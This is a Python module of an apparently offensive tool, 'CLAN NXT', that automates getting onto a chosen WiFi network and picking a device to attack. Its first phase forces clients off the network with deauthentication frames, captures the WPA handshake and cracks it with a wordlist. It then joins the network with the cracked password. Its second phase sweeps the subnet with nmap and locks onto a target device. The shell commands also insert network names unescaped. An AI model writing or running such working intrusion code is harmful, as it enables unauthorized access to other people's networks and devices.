#!/usr/bin/env python3
"""CLAN NXT - Agent: Network Access & Device Discovery (Phase 1-2)"""
import os, time, re, json, socket
from datetime import datetime
from modules.banner import C, print_status, print_header, print_table, clear_screen
from modules.utils import run_command, run_command_live, check_tool_installed, get_local_ip, get_subnet, save_report

def phase_banner(num, title, desc=""):
    print(f"\n  {C.R}{'━'*60}{C.RST}")
    print(f"  {C.R}⚡ PHASE {num}{C.RST} {C.W}{C.BOLD}» {title}{C.RST}")
    if desc: print(f"  {C.GR}  {desc}{C.RST}")
    print(f"  {C.R}{'━'*60}{C.RST}\n")

def elapsed(start):
    s=int(time.time()-start); m,s=divmod(s,60)
    return f"{m:02d}:{s:02d}"

# ─── PHASE 1: NETWORK ACCESS ───
def scan_wifi_networks():
    """Scan available WiFi networks."""
    print_status("Scanning WiFi networks...", "scan")
    if os.name == "nt":
        rc, out, _ = run_command("netsh wlan show networks mode=bssid", timeout=15)
    else:
        rc, out, _ = run_command("nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list 2>/dev/null || iwlist wlan0 scan 2>/dev/null", timeout=15)
    if rc != 0:
        print_status("Could not scan WiFi. Check adapter.", "error")
        return []
    networks = []
    if os.name == "nt":
        current = {}
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("SSID") and ":" in line and "BSSID" not in line:
                name = line.split(":",1)[1].strip()
                if name: current = {"ssid": name}
            elif line.startswith("Signal") and current:
                current["signal"] = line.split(":",1)[1].strip()
            elif line.startswith("Authentication") and current:
                current["auth"] = line.split(":",1)[1].strip()
                networks.append(current); current = {}
    else:
        for line in out.strip().splitlines():
            parts = line.split(":")
            if len(parts) >= 3:
                networks.append({"ssid": parts[0], "signal": parts[1]+"%", "auth": parts[2]})
    return networks

def wifi_attack_flow(target_ssid):
    """WiFi attack: deauth + handshake capture + bruteforce (Linux only)."""
    if os.name == "nt":
        print_status(f"{C.Y}WiFi attacks require Linux/Kali (monitor mode).{C.RST}", "warning")
        print_status("Options on Windows:", "info")
        print(f"    {C.CY}1.{C.RST} Connect manually to '{target_ssid}'")
        print(f"    {C.CY}2.{C.RST} Use Kali Linux for deauth/handshake attack")
        resp = input(f"\n  {C.Y}[?]{C.RST} Already connected to target network? (y/n): ").strip().lower()
        return resp in ("y","yes")

    # Linux: full attack flow
    tools = ["airmon-ng","airodump-ng","aireplay-ng","aircrack-ng"]
    for t in tools:
        if not check_tool_installed(t):
            print_status(f"{t} not found. Install aircrack-ng suite.", "error")
            return False

    print_status("Enabling monitor mode...", "attack")
    rc,_,_ = run_command("sudo airmon-ng start wlan0", timeout=10)
    if rc != 0:
        print_status("Could not enable monitor mode.", "error")
        return False

    print_status(f"Targeting: {C.W}{target_ssid}{C.RST}", "attack")
    print_status("Capturing handshake (30s deauth burst)...", "attack")
    cap_file = f"/tmp/clan_nxt_{target_ssid}"
    run_command(f"timeout 30 airodump-ng --bssid $(nmcli -t -f BSSID,SSID dev wifi | grep '{target_ssid}' | cut -d: -f1-6) -w {cap_file} --output-format pcap wlan0mon &", timeout=5)
    time.sleep(3)
    run_command(f"aireplay-ng --deauth 10 -a $(nmcli -t -f BSSID,SSID dev wifi | grep '{target_ssid}' | cut -d: -f1-6) wlan0mon", timeout=20)
    time.sleep(25)

    print_status("Bruteforcing handshake with rockyou.txt...", "attack")
    wordlist = "/usr/share/wordlists/rockyou.txt"
    if not os.path.isfile(wordlist):
        wordlist = "/usr/share/wordlists/fasttrack.txt"
    rc, out, _ = run_command(f"aircrack-ng -w {wordlist} {cap_file}*.cap", timeout=600)
    if "KEY FOUND" in out:
        key = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", out)
        pwd = key.group(1) if key else "unknown"
        print_status(f"Password found: {C.G}{C.BOLD}{pwd}{C.RST}", "success")
        run_command(f"sudo airmon-ng stop wlan0mon", timeout=5)
        run_command(f"nmcli dev wifi connect '{target_ssid}' password '{pwd}'", timeout=15)
        return True
    print_status("Bruteforce failed. Try a bigger wordlist.", "error")
    run_command("sudo airmon-ng stop wlan0mon", timeout=5)
    return False

def phase1_network_access(same_network):
    """Phase 1: Ensure we're on the target network."""
    phase_banner(1, "NETWORK ACCESS", "Getting onto the target network")
    start = time.time()
    if same_network:
        print_status(f"Already on target network. [{elapsed(start)}]", "success")
        return True
    networks = scan_wifi_networks()
    if not networks:
        print_status("No WiFi networks found.", "error")
        return False
    rows = [[i+1, n["ssid"], n.get("signal","?"), n.get("auth","?")] for i,n in enumerate(networks)]
    print_table(["#","SSID","Signal","Security"], rows, title="Available Networks")
    choice = input(f"\n  {C.Y}[?]{C.RST} Select network # to attack: ").strip()
    try:
        idx = int(choice)-1
        target = networks[idx]["ssid"]
    except: return False
    print_status(f"Target network: {C.W}{target}{C.RST}", "attack")
    return wifi_attack_flow(target)

# ─── PHASE 2: DEVICE DISCOVERY ───
MAC_LOOKUP_URL = "https://api.macvendors.com/"

def lookup_mac_vendor(mac):
    """Lookup MAC vendor online."""
    prefix = mac[:8].upper()
    try:
        import urllib.request
        req = urllib.request.Request(MAC_LOOKUP_URL + prefix)
        req.add_header("User-Agent","CLAN-NXT/1.0")
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.read().decode().strip()
    except: return "Unknown"

def parse_nmap_hosts(output):
    """Parse nmap -sn output for hosts."""
    hosts = []
    current_ip = None
    for line in output.splitlines():
        ip_match = re.search(r"Nmap scan report for (.+?)(?:\s+\((\d+\.\d+\.\d+\.\d+)\))?$", line)
        if ip_match:
            current_ip = ip_match.group(2) or ip_match.group(1)
        mac_match = re.search(r"MAC Address:\s+([0-9A-Fa-f:]+)\s+\((.+?)\)", line)
        if mac_match and current_ip:
            hosts.append({"ip": current_ip, "mac": mac_match.group(1), "vendor": mac_match.group(2)})
            current_ip = None
    return hosts

def phase2_discover_devices(target_desc=None):
    """Phase 2: Find all devices and identify target."""
    phase_banner(2, "DEVICE DISCOVERY", f"Finding devices" + (f" — looking for: {target_desc}" if target_desc else ""))
    start = time.time()
    subnet = get_subnet()
    print_status(f"ARP scanning {C.W}{subnet}{C.RST}...", "scan")
    rc, out, _ = run_command(f"nmap -sn {subnet}", timeout=60)
    if rc != 0:
        print_status("Network scan failed.", "error")
        return None, []
    hosts = parse_nmap_hosts(out)
    if not hosts:
        print_status("No devices found on network.", "error")
        return None, []

    print_status(f"Found {C.W}{len(hosts)}{C.RST} devices [{elapsed(start)}]", "success")
    # Enhance vendor info via MAC lookup for unknowns
    for h in hosts:
        if h["vendor"] == "Unknown" or not h["vendor"]:
            h["vendor"] = lookup_mac_vendor(h["mac"])
            time.sleep(0.5)  # Rate limit API

    rows = [[i+1, h["ip"], h["mac"], h["vendor"]] for i,h in enumerate(hosts)]
    print_table(["#","IP Address","MAC Address","Device/Vendor"], rows, title="Devices on Network")

    # Auto-match or ask user to pick target
    target_ip = None
    if target_desc:
        for h in hosts:
            if target_desc.lower() in h["vendor"].lower():
                target_ip = h["ip"]
                print_status(f"Auto-matched target: {C.W}{h['ip']}{C.RST} ({h['vendor']})", "found")
                break
    if not target_ip:
        choice = input(f"\n  {C.Y}[?]{C.RST} Select device # to attack: ").strip()
        try:
            idx = int(choice)-1
            target_ip = hosts[idx]["ip"]
        except:
            print_status("Invalid selection.", "error")
            return None, hosts
    print_status(f"Target locked: {C.R}{C.BOLD}{target_ip}{C.RST} [{elapsed(start)}]", "attack")
    return target_ip, hosts
